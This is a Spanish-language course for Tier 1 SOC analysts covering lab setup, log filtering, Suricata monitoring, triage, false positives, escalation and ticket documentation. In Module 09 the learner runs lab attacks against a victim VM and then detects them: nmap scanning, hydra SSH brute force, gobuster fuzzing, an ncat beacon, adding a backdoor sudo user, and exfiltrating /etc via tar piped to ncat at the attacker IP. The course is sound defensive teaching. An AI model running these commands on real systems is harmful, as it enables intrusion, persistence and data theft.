MÓDULO 01 Fundamentos 30 min

El rol real del analista Tier 1

El SOC (Security Operations Center) es el centro desde donde se vigila la seguridad de una organización. Se organiza en niveles. Vos entrás como Tier 1: sos la primera línea, el filtro humano entre miles de eventos y el equipo que investiga a fondo.

La pirámide del SOC

Fuentes (firewall, EDR, servidores)→ SIEM (correlación)→ TIER 1 · vos→ Tier 2 (investigación)→ Tier 3 / IR / Threat Hunting

Qué SÍ hace un Tier 1

  • Observar el flujo de alertas y detectar lo que se sale de lo normal.
  • Hacer el triage: ¿esto es real? ¿qué tan grave? ¿qué prioridad?
  • Descartar falsos positivos con criterio documentado.
  • Escalar lo que lo merece, con un resumen claro.
  • Dejar todo registrado en el ticket y el runbook.

Qué NO hace (y escala)

  • Análisis forense profundo de disco/memoria.
  • Contención y erradicación de un incidente confirmado.
  • Ingeniería inversa de malware, threat hunting proactivo.

Vocabulario que vas a usar todos los días

TérminoSignificado
EventoCualquier ocurrencia registrada (un login, una conexión, un bloqueo).
AlertaUn evento (o patrón) que una regla marcó como potencialmente interesante.
IncidenteUna alerta confirmada como actividad maliciosa o de riesgo real.
IoCIndicador de Compromiso: IP, hash, dominio, ruta que delata una amenaza.
Falso positivo (FP)Alerta que parecía maliciosa pero es actividad legítima.
SIEMPlataforma que centraliza y correlaciona logs y dispara alertas.
EDRAgente en el endpoint que detecta y responde a actividad en el host.
MTTD / MTTRTiempo medio para detectar / para responder. Las métricas que te miden.
Mentalidad
El Tier 1 no necesita resolver todo. Necesita no dejar pasar lo grave y no inundar a Tier 2 con ruido. Ese equilibrio es tu oficio.
MÓDULO 02 Fundamentos lab

Montá tu laboratorio en Kubuntu

Vamos a construir un mini-SOC dentro de tu Kubuntu. Dos máquinas virtuales en red aislada: una víctima/sensor (que también monitoreás) y una atacante. Todo con herramientas libres.

Topología del lab
atacante (Kali/Kubuntu) 10.10.10.5  ⟷  red host-only / internal  ⟷  víctima + sensor (Kubuntu) 10.10.10.10. Sin salida a internet durante los ataques.

2.1 · Preparar el host Kubuntu

analista@kubuntu — bash
analista@kubuntu:~$ sudo apt update && sudo apt -y upgrade
analista@kubuntu:~$ sudo apt -y install virtualbox virtualbox-ext-pack
# Herramientas de análisis que usaremos en el curso:
analista@kubuntu:~$ sudo apt -y install tcpdump tshark nmap net-tools \
     fail2ban auditd jq ripgrep bat ncat whois dnsutils
# tshark preguntará si usuarios no-root pueden capturar → Sí

2.2 · Las herramientas y para qué sirven

HerramientaRol en el SOC
journalctlLee los logs del sistema (systemd). Tu ventana principal.
auditd / ausearchAuditoría fina: qué proceso/usuario tocó qué archivo.
tcpdump / tsharkCaptura y lectura de tráfico de red.
nmapEscaneo de puertos — lo usa el atacante y lo detectás vos.
fail2banMini-IPS: banea IPs tras N intentos fallidos. Fuente de alertas.

2.3 · Generar "ruido" legítimo (línea base)

Un SOC real nunca está en silencio. Antes de atacar, dejá corriendo actividad normal para aprender a qué se parece lo sano:

generar baseline
$ while true; do curl -s localhost >/dev/null; sleep 7; done &
$ ssh analista@localhost echo ok   # un login legítimo ocasional
Snapshot
Antes de empezar los ataques, tomá un snapshot de las dos VMs en VirtualBox. Cuando "ensucies" la víctima, volvés al estado limpio en segundos.
MÓDULO 03 Fundamentos clave

Consola de supervivencia para el analista

El 90% de tu trabajo pasa por leer y filtrar texto rápido. Estos patrones son los que vas a repetir en cada guardia.

3.1 · Leer logs en vivo y buscar

journalctl
# Seguir TODO en tiempo real (monitoreo básico)
$ journalctl -f
# Solo SSH, últimos 200 renglones
$ journalctl -u ssh -n 200 --no-pager
# Desde hace 15 minutos, prioridad warning o peor
$ journalctl --since "15 min ago" -p warning
# El log clásico de autenticación
$ sudo tail -f /var/log/auth.log

3.2 · Los cuatro verbos del filtrado

grep · awk · sort · uniq
# ¿Qué IPs fallaron al loguear y cuántas veces? (top atacantes)
$ grep "Failed password" /var/log/auth.log \
   | grep -oE "from [0-9.]+" | awk '{print $2}' \
   | sort | uniq -c | sort -rn | head
     42 10.10.10.5     ← candidato a fuerza bruta
      3 192.168.0.23
      1 10.10.10.10
grep
grep -oE "patrón" extrae solo lo que matchea. -i ignora mayúsculas, -c cuenta.
sort | uniq -c
La dupla reina: agrupa líneas iguales y las cuenta. Con sort -rn ordenás de mayor a menor. Así sale un "top".

3.3 · JSON (alertas de SIEM/Suricata)

jq
# Mostrar solo alertas, con firma y IP origen
$ jq 'select(.event_type=="alert")
     | {sig:.alert.signature, src:.src_ip, dst:.dest_ip}' eve.json
{ "sig": "ET SCAN Nmap -sS", "src":"10.10.10.5", "dst":"10.10.10.10" }

3.4 · Red

ss · tcpdump
# ¿Qué está escuchando y quién está conectado?
$ ss -tulpn        # puertos en escucha
$ ss -tnp          # conexiones activas + proceso
# Capturar 50 paquetes hacia/desde una IP sospechosa
$ sudo tcpdump -ni any host 10.10.10.5 -c 50
Lab 3 · practicá ya
Abrí dos terminales. En una: journalctl -f. En la otra, logueá mal por SSH a propósito 3 veces. Encontrá esas 3 líneas y extraé la IP con el pipeline de arriba.
MÓDULO 04 Operación · Monitoreo 24x7 lab

Monitoreo en tiempo real

Monitorear no es mirar una pantalla sin parpadear. Es tener las fuentes correctas alimentando un tablero, y saber dónde mirar cuando algo se mueve. Vamos a montar un sensor real con Suricata y a leer sus alertas.

4.1 · Instalar el IDS de red (Suricata)

sensor — víctima 10.10.10.10
$ sudo apt -y install suricata
$ sudo suricata-update            # descarga reglas (ET Open)
$ sudo systemctl enable --now suricata
# Configurar la interfaz a monitorear en /etc/suricata/suricata.yaml → af-packet: interface
$ sudo suricata -T -c /etc/suricata/suricata.yaml  # test de config

4.2 · El archivo que vas a vivir mirando: eve.json

Suricata escribe cada evento como una línea JSON en /var/log/suricata/eve.json. Este es tu feed de alertas en vivo:

feed de alertas en vivo
# Solo alertas, en una línea legible, en tiempo real
$ sudo tail -f /var/log/suricata/eve.json \
   | jq -r 'select(.event_type=="alert")
     | "\(.timestamp[11:19])  \(.alert.severity)  \(.alert.signature)  \(.src_ip)→\(.dest_ip)"'
13:42:07  1  ET SCAN Potential SSH Scan  10.10.10.5→10.10.10.10

4.3 · Un "tablero" de consola con watch

Sin pagar un SIEM podés armar una vista que se refresca sola. Esta cuenta las alertas por firma cada 5 segundos:

mini-dashboard
$ watch -n5 'jq -r "select(.event_type==\"alert\").alert.signature" \
   /var/log/suricata/eve.json | sort | uniq -c | sort -rn | head'
   128 ET SCAN Nmap -sS
    19 ET SCAN Potential SSH Scan
     4 ET MALWARE ... C2 Checkin

4.4 · Qué significa "anómalo"

Anomalía = desvío respecto de tu línea base. Señales que siempre merecen un vistazo:

  • Volumen: muchos eventos iguales en poco tiempo (brute force, escaneo).
  • Horario: actividad administrativa a las 3 AM un domingo.
  • Dirección: un servidor interno iniciando conexiones hacia afuera.
  • Rareza: un proceso o puerto que nunca habías visto.
  • Secuencia: escaneo → login exitoso → descarga. La cadena cuenta.
Lab 4 · tu primera guardia
Dejá corriendo el feed de 4.2 en una terminal. En el M9 vas a lanzar ataques desde la atacante y ver aparecer las alertas acá. Esa es la sensación del monitoreo 24x7.
MÓDULO 05 Operación · Triage núcleo

Triage y clasificación

Llega una alerta. Tu trabajo: decidir rápido qué es, qué tan grave y qué prioridad tiene. El triage es un método, no una corazonada.

5.1 · Las cinco preguntas del triage

  1. ¿Qué disparó la alerta? Leé la firma/regla textual, no adivines.
  2. ¿Es verdadero? ¿Hay evidencia de que realmente pasó, o es un patrón casual?
  3. ¿A quién afecta? Activo crítico (controlador de dominio, base de datos) vs. puesto de pruebas.
  4. ¿En qué fase está? ¿Intento (escaneo) o éxito (login válido, ejecución)?
  5. ¿Está en curso? Un ataque activo ahora pesa más que uno de ayer ya bloqueado.

5.2 · Matriz de severidad (impacto × certeza)

Certeza bajaCerteza mediaCerteza alta
Activo críticoMediaAltaCrítica
Activo estándarBajaMediaAlta
Activo de pruebaBajaBajaMedia

5.3 · Severidad vs. prioridad

Severidad
Qué tan malo sería si es real. La determina el tipo de amenaza y el activo.
Prioridad
Qué atender primero. Suma severidad + si está en curso + si se propaga. Dos alertas "Altas" pueden tener prioridad distinta.

5.4 · Triage en consola — ejemplo con una alerta SSH

investigar una alerta
# Alerta: "múltiples fallos SSH desde 10.10.10.5". ¿Hubo ÉXITO después?
$ grep "10.10.10.5" /var/log/auth.log | grep -E "Failed|Accepted"
Failed password for root from 10.10.10.5 ...  (x40)
Accepted password for analista from 10.10.10.5 port 50122  ← ¡ÉXITO!
# Cambia todo: de "intento" pasa a "posible compromiso" → sube a Crítica
$ who; last -n5                 # ¿sesión abierta ahora?
El salto que importa
Un Accepted después de 40 Failed convierte una alerta rutinaria en el evento más urgente de tu turno. Entrenás el ojo para ese salto.
MÓDULO 06 Operación · Filtrado criterio

Filtrado de eventos y falsos positivos

El enemigo silencioso del SOC es el ruido. Una plataforma con miles de alertas inútiles esconde la de verdad. Tu trabajo es reducir el ruido sin tapar la señal.

6.1 · Anatomía de un falso positivo

  • El escáner de vulnerabilidades autorizado que corre todos los martes y "parece" un atacante.
  • El backup nocturno que abre cientos de conexiones.
  • Una regla demasiado amplia que marca tráfico normal.
  • Un admin legítimo trabajando fuera de hora.

6.2 · Antes de descartar: verificá

  1. Contexto del origen. ¿La IP es conocida/interna/autorizada? Buscala en tu lista de activos.
  2. Patrón temporal. ¿Coincide con una tarea programada (backup, scan autorizado)?
  3. Repetición idéntica. ¿Es exactamente igual cada vez? El ruido suele ser clónico.
  4. Confirmación con una segunda fuente. Que el firewall o el host digan lo mismo.
¿FP o real?
# ¿La IP que alerta está en mi inventario de scanners autorizados?
$ grep 10.10.10.50 ~/soc/activos_autorizados.txt
10.10.10.50  scanner-nessus  martes 02:00  AUTORIZADO
# Coincide IP + franja horaria → falso positivo documentado, no se escala
Nunca descartes a ciegas
Un FP se cierra con justificación escrita, no se ignora. "Lo vi mil veces" no es motivo. Si no podés explicar por qué es benigno, no es un FP: es una alerta sin investigar.

6.3 · Afinar (tuning) para que no vuelva

Cuando un FP es recurrente y legítimo, el Tier 1 lo documenta y propone una supresión al que administra el SIEM/IDS (no la aplica solo). Ejemplo de regla local de Suricata que ignora al scanner autorizado:

/etc/suricata/rules/local.rules
pass ip 10.10.10.50 any -> any any (msg:"Scanner autorizado - FP conocido"; sid:9000001; rev:1;)
Regla de propiedad
Tier 1 identifica y propone el tuning; la aplicación la aprueba Tier 2 / ingeniería de detección. Así no se crean puntos ciegos por error.
MÓDULO 07 Operación · Escalamiento decisión

Escalamiento a Tier 2

Escalar no es "pasar el problema". Es reconocer que la alerta supera tu alcance y entregarla lista para investigar, con todo el contexto que ya reuniste.

7.1 · ¿Cuándo escalar?

  • Hay evidencia de éxito (login válido tras fuerza bruta, ejecución, exfiltración).
  • Afecta un activo crítico aunque la certeza sea media.
  • La amenaza es de tipo que no cerrás en T1 (malware confirmado, C2, movimiento lateral).
  • Tras investigar, no podés confirmar ni descartar y el riesgo es alto.
  • El procedimiento (playbook) lo exige para esa categoría.

7.2 · El formato que Tier 2 necesita (y agradece)

Un buen escalamiento se lee en 30 segundos. Usá siempre esta estructura:

escalamiento.md
## ESCALAMIENTO · INC-2026-0412
Severidad:   CRÍTICA   Prioridad: P1   Estado: en curso
Resumen:    Fuerza bruta SSH exitosa contra srv-app (10.10.10.10)

Qué vi (evidencia):
 - 40 "Failed password" desde 10.10.10.5 entre 13:40–13:44
 - 1 "Accepted password" user=analista 13:44:12  ← compromiso
 - Alerta Suricata: ET SCAN Potential SSH Scan (sev 1)
 - Sesión activa ahora: who → analista pts/2 desde 10.10.10.5

Qué hice:  confirmé en auth.log y Suricata; NO contuve (fuera de T1)
Por qué escalo: éxito confirmado en activo productivo
IoCs:  10.10.10.5 ; user analista ; puerto 50122
Adjunto: auth_extract.txt, eve_alert.json
Regla de los 5 datos
Todo escalamiento responde: qué pasó, dónde (activo), cuándo, evidencia y por qué lo escalás. Si falta uno, todavía no está listo.
No contengas por tu cuenta
Bloquear una IP, matar una sesión o aislar un host son acciones de respuesta. El Tier 1 las recomienda en el escalamiento, no las ejecuta salvo que el playbook lo autorice explícitamente.
MÓDULO 08 Operación · Documentación disciplina

Documentación del SOC

Si no está documentado, no pasó. El registro es lo que permite medir, auditar, defender decisiones y transferir el turno. Es parte del trabajo, no un extra.

8.1 · Qué registra cada ticket

CampoContenido
IDINC-AAAA-NNNN, único y trazable.
TimestampDetección, y cada acción, con hora y zona (UTC es tu amiga).
Fuente / reglaQué sistema y qué firma dispararon la alerta.
Activo afectadoHost, IP, usuario, criticidad.
AnálisisQué verificaste y con qué comandos/queries.
ClasificaciónVerdadero positivo / FP / benigno + severidad.
AcciónCerrado como FP / escalado a T2 / en seguimiento.
IoCsIndicadores extraídos, listos para bloqueo/búsqueda.

8.2 · Plantilla reutilizable

~/soc/plantillas/ticket.md

Detectado: AAAA-MM-DD HH:MM UTC   Fuente: ____
Alerta: ____________________________________
Activo: host/IP ____  usuario ____  criticidad ____
---
Análisis (qué verifiqué y cómo):
  -
Clasificación: [ ] Verdadero  [ ] Falso positivo  [ ] Benigno
Severidad: [ ]Crítica [ ]Alta [ ]Media [ ]Baja

8.3 · Buenas prácticas de redacción

  • Hechos, no opiniones. "40 fallos + 1 éxito desde 10.10.10.5", no "parecía sospechoso".
  • Reproducible. Pegá el comando/query que usaste; otro debe poder repetirlo.
  • Hora absoluta y zona. Nunca "hace un rato".
  • Tiempo pasado y voz activa. "Verifiqué", "escalé".
  • Handoff claro. Al cerrar turno, lo pendiente queda explícito para el siguiente.

MÓDULO 09 Simulaciones solo en tu lab

Simular ataques para aprender a detectarlos

Acá cerrás el círculo: lanzás el ataque desde la VM atacante y lo cazás desde el sensor. Para cada uno: qué hace, cómo se lanza, cómo se ve en tus logs y la detección.

Recordatorio legal
Ejecutar esto contra IPs que no sean tus VMs del lab es ilegal. Red aislada, snapshots tomados, nada apunta a internet.

9.1 · Escaneo de puertos (reconocimiento)

ATACANTE 10.10.10.5
atacante$ nmap -sS -p- 10.10.10.10
# SYN scan de los 65535 puertos
DETECCIÓN · sensor
sensor$ tail -f eve.json | jq -r \
 'select(.alert).alert.signature'
ET SCAN Nmap -sS
# o a mano: muchísimos SYN, pocas respuestas
sensor$ sudo tcpdump -ni any \
 'tcp[tcpflags]==tcp-syn' | head

Firma: un solo origen tocando cientos de puertos en segundos. Clasificación típica: Baja/Media (reconocimiento, aún sin impacto) — pero anotalo: suele preceder algo.

9.2 · Fuerza bruta SSH

ATACANTE
atacante$ hydra -l analista \
 -P rockyou.txt ssh://10.10.10.10
# prueba miles de passwords
DETECCIÓN
sensor$ grep "Failed password" \
 /var/log/auth.log | wc -l
   1874
sensor$ sudo fail2ban-client status sshd
Banned IP list: 10.10.10.5

Firma: decenas/miles de Failed password desde una IP en minutos. Clave: buscá siempre un Accepted posterior → eso lo vuelve Crítico.

9.3 · Enumeración web / fuzzing de rutas

ATACANTE
atacante$ gobuster dir \
 -u http://10.10.10.10 -w lista.txt
DETECCIÓN
sensor$ tail -f /var/log/apache2/access.log \
 | grep " 404 "
10.10.10.5 ... "GET /admin" 404
10.10.10.5 ... "GET /backup" 404
# ráfaga de 404 desde una IP = fuzzing

Firma: muchísimos 404 en segundos desde el mismo origen, rutas tipo diccionario. Contá 404 por IP con el pipeline del M3.

9.4 · Beacon / conexión saliente sospechosa (simular C2)

VÍCTIMA (simulación)
# Simulamos un implante que "llama a casa" cada 30s
victima$ while true; do \
 ncat 10.10.10.5 4444 <<< "beacon"; \
 sleep 30; done
DETECCIÓN
sensor$ ss -tnp | grep 4444
ESTAB ... 10.10.10.10:xx→10.10.10.5:4444
# interno iniciando salida regular = beaconing

Firma: conexiones salientes periódicas (misma IP/puerto, intervalo fijo) desde un activo interno. La regularidad es la pista.

9.5 · Creación de usuario / persistencia

ATACANTE (ya dentro)
victima# useradd -m -s /bin/bash soporte
victima# usermod -aG sudo soporte
DETECCIÓN · auditd
sensor$ ausearch -m ADD_USER,ADD_GROUP -i | tail
type=ADD_USER ... acct="soporte" res=success
sensor$ journalctl -g useradd

Firma: alta de usuario, cambio de grupo sudo, clave SSH nueva, tarea cron inesperada. Siempre se escala: es post-explotación.

9.6 · Exfiltración de datos

ATACANTE
victima$ tar czf - /etc | \
 ncat 10.10.10.5 9001
# saca archivos por la red
DETECCIÓN
sensor$ sudo tcpdump -ni any \
 'dst 10.10.10.5 and port 9001' -w exfil.pcap
# volumen de salida atípico hacia IP rara

Firma: transferencia saliente grande, puerto inusual, destino no habitual. Cruzá volumen + destino + horario.

Lab 9 · la cadena completa
Encadená 9.1 → 9.2 → 9.5 → 9.6 y observá cómo una historia se arma a partir de alertas sueltas. Eso es correlación, y es lo que te hará un buen analista.
MÓDULO 10 Simulaciones integrador

Caso integral: una guardia de principio a fin

Juntá las cinco responsabilidades en un solo flujo. Esta es exactamente la secuencia mental de un turno real.

Monitoreo→ Triage→ ¿FP?→ Clasificar→ ¿Escalar?→ Documentar
  1. 13:41 · Monitoreo. En el feed de Suricata aparece ET SCAN Potential SSH Scan desde 10.10.10.5. Lo registrás como observado.
  2. 13:43 · Triage. Aplicás las 5 preguntas. Es un intento contra srv-app (activo productivo). Certeza media, impacto alto → Alta, en curso.
  3. 13:44 · ¿Falso positivo? Chequeás activos_autorizados.txt: 10.10.10.5 no está. No es el scanner de los martes. No es FP.
  4. 13:45 · Profundizás. grep Accepted → hay un login exitoso tras los fallos. Reclasificás a Crítica.
  5. 13:46 · Escalás. Completás el escalamiento.md del M7 con evidencia e IoCs, recomendás aislar la sesión, y lo pasás a Tier 2 como P1.
  6. 13:50 · Documentás. Cerrás el ticket INC-2026-0412 con la plantilla, clasificación "Verdadero positivo – escalado", y dejás el handoff.
el turno, en comandos
# 1. Monitoreo
$ tail -f eve.json | jq -r 'select(.alert).alert.signature'
# 2+3. Triage + ¿FP?
$ grep 10.10.10.5 ~/soc/activos/activos_autorizados.txt || echo "NO autorizado"
# 4. Profundizar: ¿hubo éxito?
$ grep 10.10.10.5 /var/log/auth.log | grep Accepted
# 5. Evidencia para el escalamiento
$ grep 10.10.10.5 /var/log/auth.log > ~/soc/tickets/INC-2026-0412_auth.txt
# 6. Abrir el ticket desde la plantilla
$ cp ~/soc/plantillas/ticket.md ~/soc/tickets/INC-2026-0412.md && $EDITOR $_
Lo que demostraste
Vigilaste (04), clasificaste (05), descartaste FP (06), escalaste con contexto (07) y dejaste todo registrado (08). Ese ciclo, repetido con criterio, es el trabajo.
